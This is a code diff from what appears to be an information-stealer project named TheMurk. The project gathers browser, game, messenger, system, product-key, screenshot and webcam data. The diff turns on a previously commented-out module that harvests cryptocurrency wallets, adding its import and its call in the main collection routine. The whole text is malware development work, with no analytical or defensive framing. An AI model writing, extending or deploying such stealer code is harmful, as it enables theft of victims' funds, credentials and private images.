@@ -17,6 +17,7 @@ from targets.messengers.pidgin import Pidgin
 from targets.system.system_info import SystemInfo
 from targets.system.productkey import ProductKey
 from targets.system.photos import Screenshot, WebCam
+from targets.wallets.wallets import Wallets
 
 
 
@@ -41,6 +42,7 @@ class TheMurk:
         self.Browsers()
         self.Games()
         self.Messagers()
+        self.Wallets()
         self.System()
 
     def Start(self):
@@ -79,5 +81,4 @@ class TheMurk:
         WebCam()
     
     def Wallets(self):
-        #self.msgWallets = Wallets(self.msgWallets)
-        pass
+        self.msgWallets = Wallets(self.msgWallets)
